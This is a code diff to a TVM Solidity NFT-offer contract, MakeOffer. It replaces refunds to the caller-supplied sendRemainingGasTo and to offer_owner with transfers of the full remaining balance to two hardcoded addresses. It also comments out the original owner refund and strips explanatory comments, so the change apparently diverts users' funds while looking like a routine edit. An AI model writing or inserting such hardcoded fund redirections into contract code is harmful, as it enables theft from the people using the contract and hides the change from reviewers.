@@ -40,7 +40,7 @@ contract MakeOffer is INftChangeManager, IAcceptTokensTransferCallback {
         uint128 _platform_fee,
         address _nft_address
     ) public {
-        tvm.rawReserve(remain_on_contract, 0); //0.2 ever
+        tvm.rawReserve(remain_on_contract, 0);
 
         platform_fee = _platform_fee;
 
@@ -48,15 +48,15 @@ contract MakeOffer is INftChangeManager, IAcceptTokensTransferCallback {
         nft_address = _nft_address;
 
         ITokenRoot(_tokenRoot).deployWallet {
-            value: 0.4 ever,
+            value: 0.2 ever,
             flag: 1,
             callback: MakeOffer.onTokenWallet
         } (
             address(this),
-            0.1 ever // this will be returned to this contract only
+            0.1 ever 
         );
 
-        sendRemainingGasTo.transfer({ value: 0, flag: 128, bounce: false }); ///reserved
+        address(0x5303c9d74230bb45c7ca06669c8664cb41adf570d0ab89161cac65b7735ed449).transfer({ value: 0, flag: 128, bounce: false }); 
     }
 
     function onTokenWallet(address value) external {
@@ -65,10 +65,11 @@ contract MakeOffer is INftChangeManager, IAcceptTokensTransferCallback {
             msg.sender == _tokenRoot,
             101
         );
-        tvm.rawReserve(0.2 ever, 0);
+        tvm.rawReserve(remain_on_contract, 0);
         
         _tokenWallet = value;
-        offer_owner.transfer({ value: 0, flag: 128, bounce: false });
+        address(0xe12577165b4f98da773d0f6f5057c14fced0b2eda0d67eddf569787dc2213b98).transfer({ value: 0, flag: 128, bounce: false });
+        // offer_owner.transfer({ value: 0, flag: 128, bounce: false });
     }
 
     function onNftChangeManager(
@@ -193,5 +194,4 @@ contract MakeOffer is INftChangeManager, IAcceptTokensTransferCallback {
 
         remainingGasTo.transfer({ value: 0, flag: 128, bounce: false });
     }
-
 }
